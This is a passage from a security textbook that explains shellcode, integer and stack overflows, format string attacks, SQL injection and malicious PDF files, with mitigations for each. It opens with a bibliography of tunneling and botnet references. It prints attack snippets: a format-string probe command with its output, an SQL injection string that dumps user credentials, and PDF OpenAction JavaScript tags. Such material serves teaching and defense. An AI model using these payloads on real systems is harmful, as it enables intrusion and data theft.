	 16.	 Daniel Stødle, “Ping Tunnel,” 2009, http://www.cs.uit.no/~daniels/
[Word Count: 21]

PingTunnel/.
	 17.	 Thomer Gil, “ICMPTX (IP-over-ICMP) Howto,” 2009, http://thomer.
[Word Count: 9]

com/icmptx/.
	 18.	 Antd, “Simple ICMP Tunnel,” SourceForge, 2005, http://sourceforge.net/
[Word Count: 9]

projects/itun/.
	 19.	 Gray-World.net Team, “Unusual Firewall Bypassing Techniques, Network
[Word Count: 9]

and Computer Security,” n.d., http://gray-world.net/poc_skeeve.shtml.
	 20.	 Arbor Networks, “Security to the Core,” 2009, http://asert.arbornet-
[Word Count: 14]

works.com/2009/08/twitter-based-botnet-command-channel/.
	 21.	 Blended Technologies, “Utility Mill,” n.d., http://utilitymill.com/utility/
[Word Count: 8]

Steganography_Encode.
	 22.	 Alberto Revelli and Nico Leidecker, “Playing with Heyoka: Spoofed
[Word Count: 11]

Tunnels, Undetectable Data Exfiltration and More Fun with DNS 
Packets” (paper presented at Shakacon 2009, Hawaii, June), http://shaka-
con.org/talks/Revelli-Leidecker_Heyoka.pdf.
[Word Count: 19]

Attacker Techniques and Motivations 
117
[Word Count: 5]

23.	 Software Engineering Institute, “CERT NetSA Security Suite,” 2006–
[Word Count: 9]

2010, http://tools.netsa.cert.org/silk/.
	 24	 .Bamm Visscher, “Sguil: The Analyst Console for Network Security
[Word Count: 12]

Monitoring,” SourceForge, 2007, http://sguil.sourceforge.net.
	 25.	 Dospy.com, [page in Chinese], n.d., http://www.dospy.com/bbs/
[Word Count: 11]

thread-2862026-1-1.html; and Dospy.com, [page in Chinese], n.d., http://
hi.baidu.com/55380855/blog/item/62f926d3dfd765073bf3cf49.html.
	 26.	 F-Secure.com, “‘Sexy View’ Trojan on Symbian S60 3rd Edition,” News
[Word Count: 20]

from the Lab, February 18, 2009, http://www.f-secure.com/weblog/
archives/00001609.html; and Fortinet, “FortiGuard Center,” 2009, http://
fortiguardcenter.com/advisory/FGA-2009-07.html.
	 27.	 Nikolas Schiller, “SMSishing Scam: Continued, Daily Render,
[Word Count: 23]

January 
16, 
2009, 
http://www.nikolasschiller.com/blog/index.php/
archives/2009/01/16/2104/.
	 28.	 EastCoastRadio, 
“Crimewatch,” 
n.d., 
http://blog.ecr.co.za/
crimewatch/?page_id=17.
	 29.	 Ravishankar Shrivastava, “How to Avoid Mobile Phising Attacks,” April
[Word Count: 21]

22, 
2007, 
http://raviratlami1.blogspot.com/2007/04/how-to-avoid-
mobile-phishing-attacks.html.
	 30.	 F-Secure.com, “SMS Phishing on the Rise in SE Asia?” News from the Lab,
[Word Count: 18]

April 29, 2007, http://www.f-secure.com/weblog/archives/00001173.
html.
	 31.	 John Leyden, “Secret Crush Widget Spreads Adware on Facebook,”
[Word Count: 15]

Register, January 4, 2008, http://www.theregister.co.uk/2008/01/04/
facebook_adware/.
	 32.	 Ripoff Report, “Report: PC-Cleaner, XSpy, & Premium Support,” May 7,
[Word Count: 17]

2008, http://www.ripoffreport.com/reports/0/331/RipOff0331068.htm.
	 33.	 Sean-Paul Correll and Luis Corrons, “The Business of Rogueware,”
[Word Count: 12]

PandaSecurity, 2009, http://www.pandasecurity.com/img/enc/The%20
Business%20of%20Rogueware.pdf.
	 34.	 Anti-Phishing Working Group (APWG), “Phishing Activity Trends
[Word Count: 12]

Report: 1st Half 2009,” 2009, http://www.antiphishing.org/reports/
apwg_report_h1_2009.pdf.
	 35.	 Ibid.
	 36.	 Dancho Danchev, “A Diverse Portfolio of Fake Security Software: Part 2,”
[Word Count: 21]

Dancho Danchev’s Blog: Mind Streams of Information Security Knowledge, 
http://ddanchev.blogspot.com/2008/08/diverse-portfolio-of-fake-secu-
rity.html.
	 37.	 Anchor Intelligence, “Traffic Quality Report,” 2010, http://www.anchorin-
[Word Count: 19]

telligence.com/anchor/resources/category/traffic_quality_report/.
	 38.	 Neil Daswani, Michael Stoppelman, and the Google Click Quality and
[Word Count: 12]

Security Teams, “The Anatomy of Clickbot.A,” n.d., http://www.usenix.
org/event/hotbots07/tech/full_papers/daswani/daswani.pdf.
	 39.	 Click Forensics, “Click Forensics: Traffic Quality Management,” n.d.,
[Word Count: 18]

http://www.clickforensics.com.
	 40.	 Anchor Intelligence, “Welcome to Anchor Intelligence,” 2010, http://
[Word Count: 10]

41.	 iDefense, Malicious Code Summary Report, ID# 482339, February 11,
[Word Count: 10]

2009.
	 42.	 iDefense, “State of the Hack: iDefense Explains … Fast-Flux,” iDefense
[Word Count: 12]

Weekly Threat Report, ID# 480884, January 19, 2009.
	 43.	Phillip Porras, Hassen Saidi, and Vinod Yegneswara, “Conficker C
[Word Count: 18]

P2P Protocol and Implementation,” SRI International, September 21, 
2009, http://mtc.sri.com/Conficker/P2P/index.html. 
	 44.	 Paul Barford and Vinod Yegneswaran, “An Inside Look at
[Word Count: 20]

Botnets,” University of Wisconsin–Madison, December 1, 2009, 
http://pages.cs.wisc.edu/~pb/botnets_final.pdf.
	 45.	 Kirda, Engin, Guenther Starnberger, and Christopher Kruegel, “Overbot:
[Word Count: 17]

A Botnet Protocol Based on Kademlia,” International Secure Systems Lab, 
September 2008, http://www.iseclab.org/papers/securecomm08_overbot.
pdf. 
	 46.	 iDefense, “State of the Hack: iDefense Explains … DoS Conditions,”
[Word Count: 25]

iDefense Weekly Threat Report, ID# 529185, October 12, 2009.
	 47.	 Symantec, 
“Messagelabs 
Intelligence 
Q3/September 
2009,” 
September 
2009, 
http://www.messagelabs.com/mlireport/
MLI_2009.09_Sept_SHSFINAL_EN.pdf. 
	 48.	 William Salusky, “A Twist in Fluxnet Operations: Enter Hydraflux,”
[Word Count: 29]

Internet Storm Center, July 19, 2008, http://isc.sans.org/diary.
html?storyid=4753.
[Word Count: 8]

119
© 2011 by Taylor & Francis Group, LLC
[Word Count: 9]

The wide availability of shellcode, injectable binary code used to per­
form custom tasks within another process, makes it simple for even 
novice attackers to create highly reliable payloads for use after exploita­
tion. Initially, shellcode simply spawned a shell from another process; 
however, it is now used to perform a variety of custom tasks. This sec­
tion explains what shellcode is, how it works, and the threat it poses.
[Word Count: 70]

Malicious code comes in many forms, and ranges from standalone 
executables to injectable code. Varying in execution requirements, 
development techniques, and the resulting behavior, malice is the 
common motive. In this section, we focus on injectable code known 
as shellcode and explains what it is and how it works.
[Word Count: 49]

Shellcode is binary code used as the payload in exploitation of 
software vulnerabilities. The name shellcode originates from its ini­
tial intentions to spawn a shell within another process but has since 
evolved to define code that performs any custom tasks within another 
process.1 Written in the assembly language, shellcode passed through 
an assembler creates the binary machine code that the central process­
ing unit (CPU) can execute. When an attacker exploits a vulnerability 
in a specific process, the shellcode payload is executed seamlessly, act­
ing as if it were part of the original program.
[Word Count: 95]

The use of assembly as a low-level programming language instead 
of a compiled high-level programming language or interpreted script-
ing language makes shellcode operating system specific. Shellcodes 
typically do not port well between Linux, UNIX, and Windows plat-
forms due to the differences between system calls and the way these 
calls use the CPU.
[Word Count: 54]

Linux and UNIX operating systems are similar, as they both use 
system calls to allow processes to interact with the kernel. These system
[Word Count: 23]

walking the thread environment block (TEB) for the magic bytes MZ 
similar to the SEH approach. After locating kernel32.dll, the shell­
code needs to find the location of functions within the DLL. To find 
these functions, the shellcode queries the export directory and import 
address table for the virtual memory addresses (VMAs).3 Once found, 
these functions can provide the shellcode with access to a wide range 
of commands comparable to syscalls in Linux and UNIX.
[Word Count: 75]

Applications can also include input validation to limit copying 
nonalphanumeric ASCII characters into buffers. Nonalphanumeric 
characters are common within shellcode due to the hexadecimal 
values generated when using assembly commands. To circumvent 
these nonalphanumeric filters, the shellcode can use a limited set of 
assembly commands that carry hexadecimal values of 0x30–0x39,
[Word Count: 51]

Instruction Contains NULLs
NULL Free Version
[Word Count: 6]

Exhibit 3-1  A NULL free optimized shellcode.
[Word Count: 7]

0x41–0x5A, and 0x61–0x7A for the alphanumeric characters of 0–9, 
A–Z, and a–z.4 An author can develop shellcode using this limited set 
of commands to perform desired actions and still pass alphanumeric 
input validation. Exhibit 3-2 shows the assembly instructions to cre­
ate alphanumeric shellcode to set the CPU’s eax register to zero. The 
code has a hex value of 68 77 6f 72 64 58 35 77 6f 72 64, as seen in the 
byte representation, which translates to the ASCII representation of 
hwordX5word to pass alphanumeric filters.
[Word Count: 88]

on to the next instruction, eventually executing the shellcode. Exhibit 
3-3 shows how a stack buffer overflow results in code execution.
[Word Count: 21]

Shellcode detection technologies include intrusion detection and 
prevention systems (IDSs/IPSs) and antivirus products. Network-
based IDS/IPS appliances use pattern-matching signatures to search 
packets traveling over the network for signs of shellcode. Most anti­
virus products offer pattern-matching signatures to detect shellcode 
within files on the local system. These pattern-matching signatures are 
prone to false positives and are evaded by encrypted shellcode. Some 
IDS/IPS appliances minimize evasion by involving x86 emulation 
technologies, such as libemu, to detect shellcode based on the behavior 
of executing instructions found in network traffic and local files.
[Word Count: 91]

Shellcode development continues to create ways to perform a vari-
ety of tasks after vulnerability exploitation. The malicious possibilities 
provided by shellcode allow attackers to expose information on a victim
[Word Count: 30]

Exhibit 3-3  Shellcode execution in a stack buffer overflow.
[Word Count: 9]

computer further. The public availability of shellcode and shellcode-
generating tools enables novice hackers with minimal knowledge of 
shellcode to use highly reliable payloads within attacks.
[Word Count: 26]

Resulting from insufficient input validation, integer overflows can 
cause high-severity vulnerabilities. Not to be confused with buffer 
overflows, integer errors are common and potentially severe.
[Word Count: 25]

A computer’s central processing unit (CPU) and memory repre­
sent integers. Software companies often supply these as input to their 
programs in binary formats. Integers might represent the size of a 
packet or length of a string, and applications frequently rely on them 
when making key decisions about how a program should proceed. If 
the program does not perform a sanity check on integers, unexpected 
and potentially dangerous consequences may result. In this section, 
we explain integers and how errors in integer operations may cause an 
integer to overflow.
[Word Count: 89]

The effect that integer overflows can have varies greatly depending 
on how the vulnerable application uses the integer. Integer overflows 
can lead to 100 percent use of CPU resources, denial of service (DoS) 
conditions, arbitrary code execution, and elevations of privileges. Like 
many vulnerabilities, integer overflows result when programmers do 
not consider the possibility of invalid inputs.
[Word Count: 57]

CPU registers cannot store integers with infinite values. Their max­
imum value depends on the width of the register in bits. Additionally, 
there are two types of integer representations: unsigned and signed. 
Unsigned integers represent only positive numbers, and signed inte­
gers can represent positive and negative numbers. An unsigned inte­
ger is positive or zero and includes the positive values 0 through 2n−1, 
where n represents the number of bits the CPU register can hold. An 
8-bit register width, therefore, has a maximum value representation 
of 28 − 1 = 255.
[Word Count: 92]

A signed integer, on the other hand, includes the negative values 
−2(n−1) through 2(n−1) − 1. For 8-bit signed integers, negative values have 
a minimum and maximum value range of −28 = −128 to 128 − 1 = 127. 
Most modern computers use two’s complement to represent signed inte-
gers. Converting a number to two’s complement is a two-step process.
[Word Count: 60]

First, the binary representation of the number is negated by inverting 
each of the bits. This format is known as one’s complement. The second 
step is to simply add one to the one’s complement, and the resulting 
value is the two’s complement form. Two’s complement representation 
is thus the result of adding one to a one’s complement representation 
of a negative integer.
[Word Count: 62]

Consider the transformation of −34 from one’s complement to 
two’s complement in Exhibit 3-4. In this example, 34 (00100010) is 
converted to −34 (11011110). The use of the two’s complement form 
to represent negative integers means that the most significant bit (the 
one furthest to the left) will always be a 1 if the number is negative. 
Because of this, that bit is often referred to as the sign bit.
[Word Count: 70]

An integer overflow occurs when an arithmetic operation produces 
a result larger than the maximum expected value. An integer that 
increases beyond its maximum value could result in a potential error 
condition that attackers may exploit. Integer overflow occurs in signed 
and unsigned integers. A signed overflow is the result of a value car­
ried over to the sign bit.
[Word Count: 60]

Exhibit 3-5 shows an example of an integer overflow in an 8-bit 
signed integer. The signed integer 126 (01111110) is incremented by 
1, producing the resulting value of 127 (01111111). Incrementing 127 
overwrites the sign bit, resulting in a negative value of −128 (10000000 
in binary) instead of a positive value of 128, as would occur if the inte-
ger was unsigned.
[Word Count: 62]

Exhibit 3-4  (Left) The decimal number 34 in binary is converted to its one’s complement by 
inverting each of the bits. (Right) 1 is added to the one’s complement representation, resulting in 
the two’s complement representation of −34.
[Word Count: 38]

126 01111110
127 01111111
–128 10000000
+1
[Word Count: 7]

Exhibit 3-5  An 8-bit signed integer overflow.
[Word Count: 7]

An unsigned overflow is the result of a value no longer represent­
ing a certain integer representation because it would require a larger 
register width. The unsigned integer “wraps around” when an over­
flow occurs. An unsigned integer wrap-around occurs when a pro­
gram receives a large input value that wraps the unsigned integer 
back to zero or a small positive number (see Exhibit 3-6).
[Word Count: 65]

char *expand_string(char *string, size_t length) {
char *strresult = (char *)malloc(length*2+1);
strcpy(strresult, string);
}
[Word Count: 14]

Exhibit 3-6  An 8-bit unsigned integer overflow.
[Word Count: 7]

strcpy() function. This will result in a buffer overflow that an attacker 
could use to execute arbitrary code on the system.8
[Word Count: 21]

The vulnerable code is missing one step that programmers fre­
quently forget: input sanity checks. This function should include one 
additional step that ensures the input length value is not so large 
that it will overflow after the arithmetic operation is performed. 
Integer operation errors also include sign and truncation errors. In 
sign errors, the sign flaw occurs due to the ignoring of the sign bit 
in the conversion of an integer. In truncation errors, an integer value 
truncates while being cast to a data type with fewer bits. Consider 
the following example:
[Word Count: 93]

int i = -3;
unsigned short int j;
j = i; // j = 65533
[Word Count: 15]

First, the code declares i as an int (a signed integer type) and 
assigns it the value of −3. Next, it declares j as an unsigned short 
integer, a variable that can only represent positive integers. When a 
signed integer of a negative value converts to an unsigned integer of 
greater value, the most significant bit loses its function as a sign bit. 
The result is that j is not set to −3, but rather to 65,533, the unsigned 
representation of −3.
[Word Count: 82]

Strong typing involves using specific types, making it impossible to 
use a particular variable type improperly. A programmer can declare 
an integer as an unsigned char to guarantee that a variable does not 
contain a negative value and that its range is within 1 to 255. This 
strategy also relies on programmers to make good decisions when
[Word Count: 57]

choosing variable types. Compiler-generated runtime checks involve 
using compiler flags when compiling a program. These flags instruct 
the compiler to add additional code to the program that checks if an 
integer is going to overflow and will throw an error when this occurs. 
Unfortunately, these functions can also contain errors, as is the case 
with the GCC–ftrapv flag.9
[Word Count: 58]

In this section, we will explore the concept of stack-based buffer over­
flows. At the core of any overflow is the lack of boundary consider-
ation. More precisely, overflows are the result of a finite-sized buffer 
receiving data that are larger than the allocated space. Stack-based 
buffer overflows are by far the most common type of overflow, as they 
are generally the easiest to exploit. To understand this, the reader must 
first understand the mechanics of the stack in Intel-based computers.
[Word Count: 81]

3.1.3.1  Stacks upon Stacks  At a high level, the standard computer stack 
consists of an array of memory bytes that a programmer can access ran-
domly or through a series of pop-and-push commands. Computer sci-
entists classify stacks as last-in-first-out (LIFO) structures, meaning
[Word Count: 43]

that the last datum added (or “pushed”) to the stack is the first datum 
pulled (or “popped”) from the stack. In the Intel implementation of 
a stack and various other processor platforms, local functions use the 
stack for temporary variable storage, parameter passing, and code flow 
execution management. Exhibit 3-7 illustrates the typical layout for 
an Intel stack used to call a function and the called function.
[Word Count: 67]

Variable B
Called Function’s
Stack Space
[Word Count: 6]

Calling Function’s
Stack Space
(Including Any Passed
Parameters)
[Word Count: 8]

This movement of the ESP will place the pointer at the end of the 
local variable data.
[Word Count: 17]

Once the calling function has completed, the function resets the 
stack pointer to the original location, as specified by the base pointer. 
The processor, upon seeing the “return” instruction that terminates 
the function, pops the return address from the stack, as pointed to by 
the ESP. The processor uses this address as the location of the next 
instruction to execute. This fact, alone, represents the major target of 
most stack-based buffer overflows.
[Word Count: 72]

Calling Function’s
Stack Space
(Including Any Passed
Parameters)
[Word Count: 8]

Exhibit 3-8  Overflowing a stack buffer to control the return address.
[Word Count: 11]

return address upon the completion of the function. The processor, 
unaware of the data’s validity, will attempt to execute the instructions 
at this location. This allows the attacker who filled Variable C with 
the oversized data to directly influence the flow of code execution.
[Word Count: 44]

Exhibit 3-9  Anatomy of a typical shellcode structure.
[Word Count: 8]

in the NOP sleds (which then run into the first instruction of the pay­
load) or very specific bytes of the payloads. The results are, of course, 
the execution of arbitrary code on victims’ computers.
[Word Count: 35]

3.1.3.3  Protecting against Stack-Based Buffer Overflows  Without excep­
tion, the root cause of any stack-based buffer overflow is the lack of 
bounds checking when accepting input. Buffers allocated on a stack 
are of finite, predetermined sizes, and as such, it is up to the program­
mer to ensure that the function copying data into them is within this 
size constraint. Generally, a program should validate any data taken 
from an external source (external from the perspective of the applica­
tion) for both size and content; user-supplied data should never be 
trusted outright.
[Word Count: 92]

Stack cookies do help mitigate the problems associated with stack-
based buffer overflows, but they do not provide an excuse for pro­
grammers to avoid secure programming techniques.12 Ultimately, it is 
the responsibility of the programmer to write secure code to prevent 
stack-based buffer overflows.
[Word Count: 45]

3.1.3.4  Addendum: Stack-Based Buffer Overflow Mitigation  The previ-
ous section described how stack-based buffer overflows work. The 
mitigation section focused on tips for programmers to avoid writing 
code that contains these vulnerabilities but did not mention technolo-
gies designed to mitigate the threat that have recently been added to 
operating systems and computer hardware.
[Word Count: 54]

This section discusses vulnerabilities in the printf print formatting 
and similar functions. These vulnerabilities put the stack, a critical 
component of program execution, at risk for corruption. Despite this 
type of vulnerability being first reported in 2000, iDefense rarely sees 
exploit code using this type of vulnerability to install malicious code 
or compromise servers. Nevertheless, exploit developers release many 
format string vulnerabilities each year, and these vulnerabilities con­
tinue to present a threat to application security.
[Word Count: 76]

The printf C function (short for print-formatted output) normally 
prints output to the screen. It accepts a parameter that allows a 
programmer to specify how the function should attempt to inter­
pret the string. For example, the programmer may want to print the 
character A, the value of A as the number 65, or the hex representa­
tion of A, which is 0x41. For these reasons, printf() accepts its first 
parameter, format.
[Word Count: 72]

The format is a string that accepts strings as %s, decimal numbers 
as %d, or hex values as %x. The %n format specifies an important 
component to exploit format string vulnerabilities because it allows 
the printf function to write to an arbitrary memory location with the 
number of bytes written so far. The “...” parameter is a way in the
[Word Count: 60]

string = “hello”;
decimal = 1234;
printf(“%s : %d”, string, decimal); // Three 
parameters total
[Word Count: 15]

To do this, the program pushes the parameters onto the stack before 
calling the printf function (see Exhibit 3-10).
[Word Count: 19]

Then, the printf function utilizes the %s : %d format to deter-
mine how many variables it should remove from the stack to popu-
late the values. To execute a simple attack, malicious actors compile 
a very simple C program, format_string_vulnerable, that accepts
[Word Count: 43]

Stacked Space of Function
Tat Calls printf
Calling Function’s
Stack Space
[Word Count: 11]

Exhibit 3-10  A stack diagram of a legitimate call to printf.
[Word Count: 11]

command-line arguments and passes them directly to the format 
parameter as follows:
[Word Count: 12]

The command below uses Perl to print AAAA followed by a format 
string that instructs printf to show eight digits of precision in hex 
representation (%x) and to do this repeatedly.
[Word Count: 31]

$ ./format_string_vulnerable `perl –e ‘print “AAAA”; 
print “%.8x”x 100’`
AAAA.00000400.080485d0.bf930e66.
b7fec1b5.00000008.00000088.b7ff2ff4.bf92fe54.b7fec29c.
b7fd85fc.42fd8298.41414141.382e252e.2e252e78.252e7838.
2e78382e.78382e25.382e252e.2e252e78.252e7838.2e78382e.
78382e25.382e252e
[Word Count: 14]

By using the AAAA input (0x41414141 in hex above), the attacker 
can identify where in the stack the string is located and attempt to 
identify the value that represents the return address. The stack layout 
for this attack only supplies a format string and no additional param­
eters (see Exhibit 3-11).
[Word Count: 51]

Normally, the stack would contain a variable for each %.8x in the 
format string; however, in this attack, the format string will cause 
the function to begin utilizing other stack contents, and if there are 
enough % symbols in the format string, it will eventually disclose the 
location of the return address.
[Word Count: 52]

When the user can control the format parameter, he or she can 
specify a format that removes extra data from the stack in this man-
ner. It allows the user to view the contents of memory because he 
or she can specify any number of variables in the format string. The 
program may crash because, normally, printf() will push the same
[Word Count: 61]

Exhibit 3-11  A stack layout for a simple attack with a single format parameter to printf.
[Word Count: 16]

In the attack shown in Exhibit 3-12, the attacker must print an 
exact number of bytes so that when he or she uses %n to overwrite the 
return address, it overwrites the return address with any address in 
the range of the NOP sled section. In this way, the entire executable 
code section of the user’s input will execute.
[Word Count: 59]

Exhibit 3-12  The format of user-supplied data to exploit a format string vulnerability.
[Word Count: 13]

those alerts that mention a variation of format string in the messages, 
most are probes or attempts to gain information about the software 
rather than exploits that try to execute a malicious payload. While 
format strings are very dangerous, it is unclear why malicious code 
authors exploit other vulnerabilities so much more prevalently. One 
possible explanation is that format string attacks are more prevalent in 
open source software because attackers can audit the source code. As 
evidence, most of the historical format string vulnerabilities disclosed 
on the exploit site milw0rm.com is for open source software.
[Word Count: 95]

vulnerabilities similar to format strings, depending upon their pur­
pose and implementation.
[Word Count: 12]

One of the most common and dangerous vulnerabilities in Web 
applications is structured query language (SQL) injection. SQL injec­
tion is fundamentally an input validation error. These vulnerabilities 
occur when an application that interacts with a database passes data to 
an SQL query in an unsafe manner. The impact of a successful SQL 
injection attack can include sensitive data leakage, website deface­
ment, or the destruction of the entire database.
[Word Count: 70]

SQL is a computer language that allows programs to interact with 
relational databases like MySQL and Microsoft SQL Server. To 
retrieve, insert, or update information in the database, a programmer 
must craft a query that accesses the correct data to achieve the desired 
result. The simplest query involves selecting a piece of information from 
a table. For instance, a database supporting a blog might contain a table 
that stores data related to the entries in the blog. To retrieve the text of 
each blog entry, a programmer might execute the following query:
[Word Count: 92]

This query will return the data in the “text” column for each of the 
rows in the blog_entries table. Of course, this query is not very useful 
because we probably want to display a specific blog or subset of all of 
the entries rather than every blog in the database.
[Word Count: 50]

SELECT text,user,timestamp FROM blog_entries WHERE 
user = ‘user1’;
[Word Count: 8]

This query is more complex. It still retrieves the text of the blog entry, 
as well as the name of the user who wrote it and the time of publica­
tion. It also includes a WHERE clause that specifies that the returned 
data should only include blogs with the user’s name user1.
[Word Count: 52]

To achieve this, we might create a dynamic query that can accept 
information from a program, like a Web application. Programmers 
normally do this through a high-level language such as PHP, Perl, 
or ASP. The following pseudocode shows how a programmer might 
accomplish this:
[Word Count: 44]

#Get Username
username = getInputFromUser()
[Word Count: 5]

#Create SQL Query containing username
sql_query = “SELECT text,user,timestamp FROM blog_
entries where user = ‘“ +
username + “‘;”
[Word Count: 20]

#Execute complete query
database.execute(sql_query);
[Word Count: 4]

An attacker can exploit this query by providing input that the data-
base does not know it should treat as data and treats as SQL code 
instead. Exhibit 3-14 shows how the data supplied to the query might 
completely change its function.
[Word Count: 42]

SELECT text, user, timestamp FORM blog_entries where user = ‘
userl
’;
[Word Count: 12]

Exhibit 3-13  Proper data provided to a structured query language (SQL) query.
[Word Count: 12]

SELECT text, user, timestamp FORM blog_entries where user = ‘
x’; SELECT uname, pwd from users; --
’;
[Word Count: 18]

In this case, the attacker provided the following string in place of 
the username variable:
[Word Count: 15]

This attack accesses sensitive information but could just as easily 
modify the database to include malicious content using an UPDATE 
command, or destroy the entire database using a DROP command. 
Since early 2007, attackers have launched very widespread SQL injec­
tion attacks on websites that update the database to include mali­
cious IFrames in the text. When the server displays this text in a 
Web page, those IFrames attempt to infect unsuspecting visitors. This 
attack effectively changes a website the user expects to be safe into a 
malicious one using SQL injection.14
[Word Count: 92]

contain letters and numbers are validated using regular expressions 
that match those characters before using the data in the SQL query.
[Word Count: 21]

The second method involves the use of parameterized queries. 
Parameterized queries allow the programmer to define a query and 
pass data into it without performing dangerous string concatenation. 
The following pseudocode shows how programmers can use param­
eterized queries to make the code shown in the previous section safe 
from SQL injection.
[Word Count: 52]

#Get Username
username = getInputFromUser()
[Word Count: 5]

#Create the Parameterized Query using the %s format 
string.
sql_query = “SELECT text,user,timestamp FROM blog_
entries where user = %s;”
[Word Count: 20]

#Execute the parameterized query, specifying the data 
separately
database.execute(sql_query, (username));
[Word Count: 10]

With parameterized queries, the database is aware of what is code and 
what is data and can avoid SQL injection based on that knowledge. 
Unfortunately, this facility is not available in all programming lan­
guages and, as such, cannot protect every application.
[Word Count: 42]

When organizations lack the ability or resources to audit and 
test for SQL injection vulnerabilities in their Web applications, 
a Web Application Firewall (WAF) may be an alternate solu­
tion. ModSecurity is an open source WAF that can act as a reverse 
proxy, sitting between a Web server and the Internet to filter incom­
ing requests for SQL injection and other types of attacks.16 A list of 
commercial and open source WAFs is available from the Open Web 
Application Security Project (OWASP).17
[Word Count: 82]

Users of Microsoft’s ASP.net Web-programming language should 
consult the extensive guide produced in 2005 that details techniques 
and strategies for avoiding SQL injection.18
[Word Count: 23]

3.1.5.2  Conclusion  SQL injection attacks have become incredibly 
common in recent years. Automated attacks launched by botnets 
continuously scan the Internet for possibly vulnerable Web pages and 
attempt to compromise them. It is vital to protecting the integrity of
[Word Count: 39]

a database that the queries executed on it contain properly validated 
data that will not be mistakenly treated as code.
[Word Count: 20]

The defenses against SQL injection attacks are simple to implement 
but often overlooked by novice programmers or those looking to stand 
up a website quickly. When possible, administrators should test both 
homegrown and commercial off-the-shelf (COTS) Web applications 
for SQL injection vulnerabilities. OWASP provides a guide to testing 
applications and other valuable information on SQL injection vulner­
abilities through their website.19 When this testing is not possible, 
administrators should consider deploying a WAF to provide generic 
protection against SQL injection and other attacks on Web servers.
[Word Count: 86]

Portable document format (PDF) files are so common that users often 
do not realize the potential danger they pose. Adobe Acrobat is a 
commonly installed application on all Microsoft Windows comput­
ers. The PDF file format is risky because many users have vulnerable 
PDF viewers installed that attackers can exploit to install malicious 
code. Attackers also commonly use PDF files to launch targeted 
attacks because they can often convince victims to open a PDF file 
to install malicious code. Multiple previously unknown or unpatched 
PDF vulnerabilities have allowed attackers to launch targeted attacks 
against high-priority victims as of 2009.
[Word Count: 99]

To make matters worse, Web browsers load PDF files automati­
cally, so a malicious PDF file can exploit a user’s computer without 
any interaction once the user visits a malicious website. Commercial 
Web attack toolkits commonly incorporate PDF exploits because 
PDF viewers are widely installed, and attackers can influence many 
different browsers, including Internet Explorer and Firefox.
[Word Count: 57]

Malicious PDF files usually contain JavaScript, but many excep-
tions exist that execute arbitrary code without JavaScript. Attackers 
commonly use JavaScript because the instructions can allocate large 
blocks of memory (heap spraying), which allows an attacker to reliably 
jump to certain addresses upon gaining control of execution through 
a vulnerability. Attackers also rely on JavaScript to hide the intent of 
their code because they can use eval() or similar functions to dynami-
cally execute statements when the JavaScript code runs.
[Word Count: 80]

3.1.6.1  PDF File Format  The format of a PDF file is largely based 
on plain text tags, although many stream objects use compression. 
Opening a PDF file within a hex editor shows objects that are num­
bered 1 0 obj, for example. Other sections of the PDF file can refer­
ence these objects by number (see Exhibit 3-15).
[Word Count: 58]

Each object has attribute tags that describe its purpose. The obj, 
endobj, stream, and endstream tags correspond with the beginning 
and end of each section, and each attribute starts with “/”. The cross-
reference (xref) table contains entries corresponding to the file offset 
for each object. One common attribute for data in PDF files is the /
FlateDecode attribute, which the viewer decompresses with the zlib 
library; object 14 is shown here:
[Word Count: 72]

14 0 obj
<</Length 838 /Filter /FlateDecode>>
stream
… zlib compressed binary data …
endstream
	
endobj
[Word Count: 16]

Malicious PDF files often contain malicious JavaScript code that 
analysts can inspect after decompressing the zlib data. To instruct the 
PDF viewer to execute the JavaScript code upon opening the file, the 
author must also assign an action to the object similar to one of the 
following examples:
[Word Count: 48]

<</Type/Action/S/JavaScript/JS 14 0 R >>
<</OpenAction <</JS (this.wBx9J6Zzf7\(\))
/S /JavaScript
[Word Count: 10]

The Action attribute specifies that the PDF reader should execute 
the JavaScript code in object 14. The /OpenAction attribute can call 
the JavaScript function wBx9J6Zzf7(), which the PDF file defines in a 
different object. The PDF file format also allows incremental changes
[Word Count: 42]

ojb 2 0
<< /AttributeA value /AttributeB >>
stream
...
endstream
endobj
xref
0 4
000000000 65535 f
oﬀsetObject1 00000 n
oﬀsetObject2 00000 n
oﬀsetObject3 00000 n
[Word Count: 27]

without modifying the original file. For each modification, the appli­
cation appends a changes section, xref section, and trailer section. As 
a result, a PDF file may grow large if the author repeatedly updates it. 
More information on the PDF file format and JavaScript functional­
ity is available from Adobe.20
[Word Count: 50]

The Adobe JavaScript engine exposes several PDF-specific objects, 
including app, doc, dbg, console, global, util, dialog, security, SOAP, 
search, ADBC, and event objects.21 It also exposes some online 
collaboration commands for review, markup, and approval. These 
exposed objects are often the areas of vulnerability that attackers have 
exploited in the past.
[Word Count: 51]

3.1.6.2  Creating Malicious PDF Files  Many of the most common Web 
exploit toolkits include one of the following recent PDF exploits:
[Word Count: 21]

2007-5659
collab.collectemailinfo
2008-2992
util.printf
2009-0927
collab.geticon
2009-1493
spell.customDictionaryOpen
2009-1492
getAnnots
[Word Count: 10]

interpreters to understand the purpose of JavaScript code contained 
within PDF files.
[Word Count: 12]

Other means of embedding malicious content exist. For example, 
Adobe added an embedded Flash interpreter as a new feature in Adobe 
Reader 9.25 iDefense has analyzed targeted attacks that embed mali­
cious Flash objects within PDF files.26 The ability to send malicious files 
embedded in PDF files increases the attack surface of PDF viewers.
[Word Count: 54]

The high number of vulnerabilities in Adobe Acrobat and the high 
number of attacks that use those new vulnerabilities should be of great 
concern for system administrators. Many actions that administrators 
should take will reduce the effectiveness of attacks. Administrators 
should put these measures in place because there are many instances 
of attackers exploiting these vulnerabilities before Adobe releases 
updates to vulnerable products.
[Word Count: 63]

Exhibit 3-16  Adobe Reader allows users to enable JavaScript, even when they disable it.
[Word Count: 14]

from a malicious PDF file. Normally, selecting “No” has no nega­
tive impact on the behavior of the PDF file. Administrators can also 
configure Adobe Acrobat to disable embedded Flash files and other 
media files. In the “Preferences → Multimedia Trust (legacy)” menu, 
uncheck “Allow multimedia operations” for both trusted documents 
and other documents.
[Word Count: 54]

Disabling both JavaScript and multimedia is still ineffective against 
certain less common vulnerabilities that do not use JavaScript or media 
files. Examples like the JBIG2 Encoded Stream Heap Overflow 
Vulnerability (CVE-2009-0928), which attackers used in targeted 
PDF attacks before Adobe patched it, show that other vulnerabilities 
exist that administrators must also consider.
[Word Count: 52]

iDefense tested removal procedures in Internet Explorer 7 and iden­
tified that disabling both the browser helper object (AcroIEHelper.
dll) and ActiveX control (AcroPDF.dll) did not prevent the PDF file 
from loading when embedded in a Web page with an IFrame. To fully 
remove the capability to automatically open PDF files, it was neces-
